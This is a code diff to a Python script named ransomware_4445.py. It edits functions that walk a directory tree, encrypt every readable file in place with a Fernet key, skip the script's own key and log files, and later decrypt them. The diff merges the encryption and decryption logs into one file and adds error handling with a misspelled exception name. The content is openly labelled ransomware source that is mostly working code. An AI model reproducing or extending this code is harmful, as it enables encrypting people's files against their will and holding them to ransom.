@@ -68,14 +68,14 @@ def encrypt_specific_file(file,key):
 	if(has_permission_to_write(file)):
 		with open(file, "wb") as encryptedFile:
 			encryptedFile.write(encrypted_data)
-		with open("./.encrypted_4445.log", "a") as log:
-			log.write(file + "\n")
+		with open("./.ransomware_4445_logs.log", "a") as log:
+			log.write(file +"\t"+ "ENCRYPTED" +  "\n")
 
 
 def encrypt_directory(path, key):
 	for root, dirs, files in os.walk(path):
 		for file in files:
-			if(file== "ransomware_4445.py" or file == ".encryption_key_4445.key" or file == ".encrypted_4445.log" or file == ".decrypted_4445.log"):
+			if(file== "ransomware_4445.py" or file == ".encryption_key_4445.key" or file == ".ransomware_4445_logs.log"):
 				continue
 			file_path = os.path.join(root, file)
 			if(has_permission_to_read(file_path)):
@@ -83,21 +83,25 @@ def encrypt_directory(path, key):
 
 
 def decrypt_specific_file(file,key):
-	with open(file, "rb") as specifiedFile:
-		data = specifiedFile.read()
-	decrypted_data = Fernet(key).decrypt(data)
+	try:
+		with open(file, "rb") as specifiedFile:
+			data = specifiedFile.read()
+		decrypted_data = Fernet(key).decrypt(data)
 
-	if(has_permission_to_write(file)):
-		with open(file, "wb") as encryptedFile:
-			encryptedFile.write(decrypted_data)
-		with open("./.decrypted_4445.log", "a") as log:
-			log.write(file + "\n")
+		if(has_permission_to_write(file)):
+			with open(file, "wb") as encryptedFile:
+				encryptedFile.write(decrypted_data)
+			with open("./.ransomware_4445_logs.log", "a") as log:
+				log.write(file +  "\t" + "DECRYPTED" + "\n")
+	except Expection as e:
+		with open("./.ransomware_4445_logs.log", "a") as log:
+			log.write(file + "\t" + "failed to decrypt" + "\n")
 
 
 def decrypt_directory(path,key):
 	for root, dirs, files in os.walk(path):
 		for file in files:
-			if(file == "ransomware_4445.py" or file == ".encryption_key_4445.key" or file == ".encrypted_4445.log" or file == ".decrypted_4445.log"):
+			if(file == "ransomware_4445.py" or file == ".encryption_key_4445.key" or file == ".ransomware_4445_logs.log"):
 				continue
 			file_path = os.path.join(root,file)
 			if(has_permission_to_read(file_path)):
